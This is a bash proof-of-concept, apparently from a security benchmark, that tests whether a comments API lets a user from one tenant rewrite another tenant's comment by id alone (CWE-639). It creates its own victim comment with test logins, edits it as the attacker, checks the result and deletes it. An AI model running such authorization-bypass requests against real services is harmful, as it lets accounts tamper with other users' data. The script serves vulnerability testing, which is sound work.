#!/usr/bin/env bash
# BOLA-WRITE-001 (CWE-639): editing a comment updates it by id alone, so a
# Globex user rewrites a comment an Acme editor left on an Acme post. The PoC
# makes its own victim comment and deletes it afterwards.
set -u; . "$(dirname "$0")/_lib.sh"
new_jar ED; new_jar ATK
login_as "$ED" editor@bench.local Editor123!
login_as "$ATK" user2@bench.local User123!

PID=$(post_id acme-roadmap)
CID=$(curl -s -b "$ED" -X POST "$TARGET/api/comments" -H 'content-type: application/json' \
  -d "{\"postId\":\"$PID\",\"body\":\"Looks good to me.\"}" | json_get id)
[ -n "$CID" ] || { echo "could not create the victim comment" >&2; exit 2; }

MARK="BOLA-WRITE-MARKER-$$"
curl -s -b "$ATK" -X PATCH "$TARGET/api/comments/$CID" -H 'content-type: application/json' \
  -d "{\"body\":\"$MARK\"}" >/dev/null
BODY=$(comment_field "$CID" body)

curl -s -b "$ED" -X DELETE "$TARGET/api/comments/$CID" >/dev/null
[ "$BODY" = "$MARK" ]
